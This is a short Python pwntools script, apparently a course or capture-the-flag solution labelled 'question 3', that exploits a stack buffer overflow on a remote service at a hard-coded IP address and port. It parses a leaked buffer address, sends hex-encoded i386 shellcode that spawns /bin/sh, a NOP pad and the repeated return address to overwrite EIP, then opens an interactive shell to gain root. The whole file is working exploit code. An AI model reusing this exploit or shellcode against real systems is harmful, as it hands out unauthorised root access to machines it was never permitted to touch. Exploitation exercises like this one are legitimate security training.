#!/usr/bin/env python
from pwn import *

context(arch = 'i386', os = 'linux')
# question 3
conn = remote('140.115.53.13',11002)

conn.recvuntil("The buffer of your input ")

buf_address = conn.recvline();

# remove '\n'
buf_address = buf_address.strip('\n')

# remove "0x"
buf_address = buf_address.split("x")[1]

one = buf_address[0] + buf_address[1]
two = buf_address[2] + buf_address[3]
three = buf_address[4] + buf_address[5]
four = buf_address[6] + buf_address[7]

# add '\x'
xone = ('\\x' + one).decode('string_escape')
xtwo = ('\\x' + two).decode('string_escape')
xthree = ('\\x' + three).decode('string_escape')
xfour = ('\\x' + four).decode('string_escape')

# shellcode 55bytes
shellcode = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"

# nop 45bytes 
overflow = '\x90'*45

# buf address 4bytes
bufadd = xfour + xthree + xtwo + xone

# guess 10 times buf address (40byes) will cover the eip
inputString = shellcode + overflow + bufadd*10 + '\n'

conn.recvuntil("Your input : ")
conn.send(inputString)

#after get root, we can use interactive mode, it will more convenient
conn.interactive()


